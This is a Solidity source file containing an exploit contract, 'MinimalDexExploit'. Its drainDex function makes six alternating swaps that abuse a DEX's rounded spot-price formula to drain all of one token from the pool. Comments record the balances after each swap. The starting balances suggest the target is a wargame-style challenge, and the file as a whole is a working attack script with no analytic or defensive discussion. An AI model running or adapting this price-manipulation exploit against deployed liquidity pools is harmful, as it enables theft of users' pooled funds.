// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MinimalDexExploit {
    function drainDex(address dexAddress) external {
        IDex dex = IDex(dexAddress);
        
        // First approve the dex to spend our tokens
        dex.approve(dexAddress, type(uint256).max);
        
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // Perform the swaps to drain one token
        // Initial: Player 10/10, DEX 100/100
        
        // Swap 1: 10 token1 for token2 (get 10)
        dex.swap(token1, token2, 10);
        // Now: Player 0/20, DEX 110/90
        
        // Swap 2: 20 token2 for token1 (get 24)
        dex.swap(token2, token1, 20);
        // Now: Player 24/0, DEX 86/110
        
        // Swap 3: 24 token1 for token2 (get 30) 
        dex.swap(token1, token2, 24);
        // Now: Player 0/30, DEX 110/80
        
        // Swap 4: 30 token2 for token1 (get 41)
        dex.swap(token2, token1, 30);
        // Now: Player 41/0, DEX 69/110
        
        // Swap 5: 41 token1 for token2 (get 65)
        dex.swap(token1, token2, 41);
        // Now: Player 0/65, DEX 110/45
        
        // Swap 6: Need exactly 45 token2 to drain all 110 token1
        dex.swap(token2, token1, 45);
        // Now: Player 110/20, DEX 0/90
    }
}